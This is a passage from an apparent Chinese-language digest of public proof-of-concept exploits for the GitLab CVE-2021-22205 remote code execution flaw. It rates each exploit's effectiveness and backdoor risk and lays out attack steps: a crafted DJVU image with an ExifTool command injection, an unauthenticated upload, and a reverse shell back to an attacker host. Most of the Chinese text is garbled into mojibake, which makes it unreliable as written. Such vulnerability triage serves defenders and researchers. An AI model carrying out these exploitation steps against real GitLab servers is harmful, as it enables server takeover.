CVE-2021-22205æ˜¯GitLabä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ExifToolå‘½ä»¤æ³¨å…¥ä»£ç ï¼Œå½“GitLabå°è¯•å¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„POCä»£ç ï¼Œæ­¤æ¼æ´žåˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ï¼Œå¹¶ä¸”CISA KEVç›®å½•ä¹Ÿæ”¶å½•äº†è¯¥æ¼æ´žï¼Œè¯´æ˜Žå­˜åœ¨è¢«åˆ©ç”¨çš„æƒ…å†µã€‚POCä»£ç å®žçŽ°äº†æœªæŽˆæƒæƒ…å†µä¸‹çš„RCEï¼Œåˆ©ç”¨äº†ä¸Šä¼ åŠŸèƒ½å’ŒExifToolçš„å‘½ä»¤æ³¨å…¥ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯å®žçŽ°æ¼æ´žåˆ©ç”¨ï¼Œå¹¶æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚é£Žé™©è¯„ä¼°ä¸º5%ï¼Œè¾ƒä½Žã€‚

*   ä»£ç ç»“æž„æ¸…æ™°ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæž„é€ æ¶æ„å›¾åƒä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚
*   ä»£ç ä¸­å­˜åœ¨ä¸ŽDNSlogäº¤äº’çš„éƒ¨åˆ†ï¼Œå¯ä»¥éªŒè¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚
*   æ€»ä½“è€Œè¨€ï¼Œä»£ç åŠŸèƒ½é›†ä¸­äºŽæ¼æ´žåˆ©ç”¨æœ¬èº«ï¼Œæ²¡æœ‰å‘çŽ°é¢å¤–æ¶æ„è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆæ‰¾åˆ°ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ (`/users/sign_in`)ã€‚
2.  ä»Žç™»å½•é¡µé¢çš„HTMLæºä»£ç ä¸­æå–CSRF tokenï¼Œç”¨äºŽåŽç»­çš„POSTè¯·æ±‚ã€‚
3.  æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ExifToolå‘½ä»¤çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆå®žé™…ä¸Šæ˜¯DJVUæ–‡ä»¶ï¼‰ã€‚è¯¥æ¶æ„å‘½ä»¤è¢«åµŒå…¥åˆ°å›¾åƒçš„metadataä¸­ã€‚
4.  é€šè¿‡å‘ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶çš„multipart/form-data POSTè¯·æ±‚ï¼Œä¸Šä¼ è¯¥å›¾åƒã€‚
5.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifToolæ‰§è¡Œå›¾åƒmetadataä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

åˆ©ç”¨ä»£ç ä¸­åŒ…å«ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

*   æ£€æŸ¥æ¨¡å¼ (`-v true`)ï¼šé€šè¿‡ä¸Šä¼ åŒ…å«ç‰¹å®šDNSlogåŸŸåçš„æ¶æ„å›¾ç‰‡ï¼Œæ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚
*   æ”»å‡»æ¨¡å¼ (`-a true`)ï¼šå…è®¸æ”»å‡»è€…æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ (`-c command`)ï¼Œç›´æŽ¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æ–‡ä»¶æ¨¡å¼ (`-s true`): ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ `-f file`ã€‚

æ€»ç»“ï¼šæ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„å›¾åƒï¼Œåˆ©ç”¨ExifToolå‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå®žçŽ°åœ¨ç›®æ ‡GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [osungjinwoo/CVE-2021-22205-gitlab](https://github.com/osungjinwoo/CVE-2021-22205-gitlab)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #20

**æ¥æº**: [CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md](../2021/CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„å¤šä¸ªç‰ˆæœ¬ã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶è€Œå¯¼è‡´çš„ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨åˆ†æžï¼š**

æä¾›çš„`DejaVu.sh`è„šæœ¬ç”¨äºŽåˆ©ç”¨ CVE-2021-22205ã€‚ä»¥ä¸‹æ˜¯è„šæœ¬çš„å·¥ä½œåŽŸç†ï¼š

1.  **å‚æ•°å¤„ç†ï¼š** è„šæœ¬æŽ¥å— LHOSTï¼ˆæ”»å‡»è€…ç›‘å¬åœ°å€ï¼‰ã€LPORTï¼ˆæ”»å‡»è€…ç›‘å¬ç«¯å£ï¼‰å’Œ WEBHOSTï¼ˆç›®æ ‡ GitLab å®žä¾‹çš„ URLï¼‰ä½œä¸ºå‚æ•°ã€‚
2.  **ç”Ÿæˆæ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `lol.jpg` çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶çš„å‰é¢éƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„JPEGæ–‡ä»¶ï¼ŒåŽé¢é™„åŠ äº†ç²¾å¿ƒæž„é€ çš„ExifToolå‘½ä»¤æ³¨å…¥æœ‰æ•ˆè½½è·ã€‚
3.  **ExifTool å‘½ä»¤æ³¨å…¥ï¼š** æ¼æ´žçš„æ ¹æºåœ¨äºŽ GitLab ä½¿ç”¨ ExifTool å¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶å­˜åœ¨ç¼ºé™·ã€‚é€šè¿‡åœ¨å›¾åƒå…ƒæ•°æ®ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
4.  **åå¼¹ Shellï¼š** è¯¥è„šæœ¬ä½¿ç”¨ `mkfifo` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åŽä½¿ç”¨ `telnet` è¿žæŽ¥åˆ°æ”»å‡»è€…çš„ LHOST å’Œ LPORTï¼Œå¹¶å°† shell çš„è¾“å…¥å’Œè¾“å‡ºé‡å®šå‘åˆ°è¯¥ç®¡é“ã€‚è¿™æœ‰æ•ˆåœ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªåå¼¹ shellã€‚
5.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** è„šæœ¬ä½¿ç”¨ `curl` å‘½ä»¤å°† `lol.jpg` æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°æŒ‡ç¤º `curl` å°†è¯¥æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å‘é€ã€‚æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ï¼Œä»Žè€Œè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† CVE-2021-22205 ä¸­æè¿°çš„æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚é€šè¿‡è®¾ç½®æ­£ç¡®çš„ LHOSTã€LPORT å’Œ WEBHOSTï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ä¸ŠèŽ·å¾— shell è®¿é—®æƒé™ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

åˆ†æžæä¾›çš„è„šæœ¬ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬é€»è¾‘æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨ CVE-2021-22205 æ¼æ´žã€‚æ²¡æœ‰å‘çŽ°ä»»ä½•è¯•å›¾åœ¨å—å®³è€…ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ã€åˆ é™¤æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„éšè—ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š**

1.  æ”»å‡»è€…å‡†å¤‡åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é…ç½® `DejaVu.sh` è„šæœ¬ï¼Œæä¾›æ”»å‡»è€…çš„ç›‘å¬åœ°å€å’Œç«¯å£ä»¥åŠç›®æ ‡ GitLab å®žä¾‹çš„ URLã€‚
3.  æ”»å‡»è€…æ‰§è¡Œè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚
4.  GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè°ƒç”¨ ExifTool æå–å…ƒæ•°æ®ã€‚
5.  ExifTool æ‰§è¡Œæ¶æ„å…ƒæ•°æ®ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹åå¼¹ shellã€‚
6.  æ”»å‡»è€…çŽ°åœ¨å¯ä»¥é€šè¿‡åå¼¹ shell ä¸Ž GitLab æœåŠ¡å™¨äº¤äº’ã€‚

**é¡¹ç›®åœ°å€:** [overgrowncarrot1/DejaVu-CVE-2021-22205](https://github.com/overgrowncarrot1/DejaVu-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #21

**æ¥æº**: [CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md](../2021/CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæŽˆæƒç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯è§¦å‘

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽGitLab CE/EEä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶éªŒè¯ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ã€æœç´¢å¼•æ“Žç»“æžœï¼ˆè™½ç„¶å®žé™…çš„æœç´¢å¼•æ“Žç»“æžœä¸ºç©ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾æœåˆ°çš„æ˜¯ç›¸å…³çš„æ¼æ´žåˆ†æžå’Œå¤çŽ°æ–‡ç« ï¼‰å’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤å®šè¯¥POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯æ˜Žç¡®æŒ‡å‡ºè¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»¥åŠæ¼æ´žæˆå› ï¼ŒPOCä»£ç ä¹Ÿé€šè¿‡æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„DJVUå›¾åƒæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

åˆ†æžæä¾›çš„POCä»£ç ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­åµŒå…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¯¥è„šæœ¬ä»Žå‘½ä»¤è¡ŒæŽ¥æ”¶ç›®æ ‡GitLab URLå’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åŽæž„é€ HTTPè¯·æ±‚ï¼Œä¸Šä¼ åŒ…å«æ¶æ„payloadçš„å›¾åƒæ–‡ä»¶ã€‚è™½ç„¶ä»£ç ä¸­åŒ…å«ä»£ç†è®¾ç½®ï¼ˆ`proxyUrl, err := url.Parse("http://localhost:9090")`ï¼‰ï¼Œé»˜è®¤ä½¿ç”¨`http://localhost:9090`ä½œä¸ºä»£ç†ã€‚å¦‚æžœæ”»å‡»è€…æƒ³è¦è¿›è¡Œä¸­é—´äººæ”»å‡»æˆ–æµé‡åŠ«æŒï¼Œæ¶æ„ä¿®æ”¹ä»£ç†æœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æŠ•æ¯’é£Žé™©ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºæ¶æ„ä»£ç†æœåŠ¡å™¨ï¼Œä½†è¿™ç§é£Žé™©è¾ƒä½Žï¼Œå› ä¸ºè¿™æ›´å¤šçš„æ˜¯ä¸€ç§é…ç½®é—®é¢˜ï¼Œè€Œéžä»£ç æœ¬èº«åŒ…å«æ¶æ„é€»è¾‘ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£Žé™©å¾ˆä½Žï¼Œå¤§çº¦1%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æžï¼š**

1.  æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„payloadçš„DJVUå›¾åƒæ–‡ä»¶ã€‚Payloadä¸­åŒ…å«è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ©ç”¨äº†ExifToolå¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚
2.  æ”»å‡»è€…é€šè¿‡HTTP POSTè¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹çš„`/uploads/user`ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹ç”¨äºŽå¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚
3.  GitLabä½¿ç”¨ExifToolè§£æžä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ã€‚ç”±äºŽæ–‡ä»¶åŒ…å«æ¶æ„payloadï¼ŒExifToolä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹shellã€è¯»å–æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [pizza-power/Golang-CVE-2021-22205-POC](https://github.com/pizza-power/Golang-CVE-2021-22205-POC)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #22

**æ¥æº**: [CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md](../2021/CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯æŒ‡å‡ºè¯¥æ¼æ´žçš„å½±å“æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒCVSSè¯„åˆ†ä¸º10åˆ†ï¼ˆCRITICALï¼‰ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§å¾ˆé«˜ã€‚æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆ`exploit.py`ï¼‰é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žï¼ˆå®žé™…ä¸Šæ˜¯ CVE-2021-22204ï¼ŒExifTool æœ¬èº«çš„æ¼æ´žï¼‰ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`scan` å‡½æ•°ç”¨äºŽæ£€æµ‹ç›®æ ‡æ˜¯å¦æ˜“å—æ”»å‡»ï¼Œ`attack` å‡½æ•°ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

åˆ†æžæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¹¶æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`exploit.py` ä¸»è¦åŠŸèƒ½æ˜¯ï¼š

1.  èŽ·å– GitLab çš„ CSRF tokenã€‚
2.  æž„é€ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚
3.  å‘ GitLab çš„ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒçš„ POST è¯·æ±‚ã€‚
4.  å¦‚æžœå“åº”åŒ…å« â€œFailed to process imageâ€ï¼Œåˆ™è®¤ä¸ºç›®æ ‡å­˜åœ¨æ¼æ´žã€‚

æ”»å‡»å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸Žæ£€æµ‹å‡½æ•°ç±»ä¼¼,åªä¸è¿‡æ˜¯æž„é€ çš„payloadä¸åŒ,ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚
æ•´ä¸ªæµç¨‹æ˜¯æ ‡å‡†çš„æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼Œæ²¡æœ‰å‘çŽ°æ¤å…¥åŽé—¨æˆ–è€…æ¶æ„ä»£ç çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨æä¾›çš„ `exploit.py` è„šæœ¬ï¼ŒæŒ‡å®šç›®æ ‡ GitLab URL å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  è„šæœ¬ä¼šè‡ªåŠ¨èŽ·å– CSRF tokenï¼Œæž„é€ æ¶æ„ DJVU å›¾åƒï¼Œå¹¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ã€‚
4.  GitLab æœåŠ¡å™¨ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œç”±äºŽ ExifTool å­˜åœ¨ CVE-2021-22204 æ¼æ´žï¼Œä¼šå¯¼è‡´æ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„å‘½ä»¤ã€‚
5.  å‘½ä»¤æ‰§è¡Œçš„ç»“æžœå¯ä»¥é€šè¿‡ DNS æŸ¥è¯¢æˆ–è€…å…¶ä»–æ–¹å¼è¿”å›žç»™æ”»å‡»è€…ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š**ä¸Šä¼ æ¶æ„æž„é€ çš„DJVUæ–‡ä»¶ -> è§¦å‘ExifToolè§£æž -> ExifToolå‘½ä»¤æ³¨å…¥ -> æ‰§è¡Œä»»æ„ä»£ç **

**é¡¹ç›®åœ°å€:** [runsel/GitLab-CVE-2021-22205-](https://github.com/runsel/GitLab-CVE-2021-22205-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #23

**æ¥æº**: [CVE-2021-22205-shang159_CVE-2021-22205-getshell.md](../2021/CVE-2021-22205-shang159_CVE-2021-22205-getshell.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶è§£æžä¸å½“ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚DJVUæ ¼å¼ï¼‰å¹¶ä¸Šä¼ åˆ°GitLabï¼Œå½“GitLabä½¿ç”¨ExifToolç­‰å·¥å…·è§£æžå›¾ç‰‡æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ ¹æ®æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æž„é€ Payloadï¼š**  ä½¿ç”¨Pythonè„šæœ¬ç”ŸæˆåŒ…å«åå¼¹shellå‘½ä»¤çš„DJVUå›¾ç‰‡ã€‚è„šæœ¬é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„å…ƒæ•°æ®ï¼ˆCopyrightå­—æ®µï¼‰åµŒå…¥å‘½ä»¤ã€‚PayloadåŒ…å«æ‰§è¡Œshellå‘½ä»¤çš„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellåˆ°æ”»å‡»è€…æŽ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚
2.  **ä¸Šä¼ å›¾ç‰‡ï¼š** å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ åˆ°GitLabã€‚æ ¹æ®POCæè¿°ï¼Œä¸åŒç‰ˆæœ¬çš„GitLabä¸Šä¼ ç‚¹å¯èƒ½ä¸åŒï¼Œéœ€è¦å°è¯•ä¸åŒçš„ä¸Šä¼ è·¯å¾„ï¼ˆä¾‹å¦‚issueé¡µé¢ï¼‰ã€‚
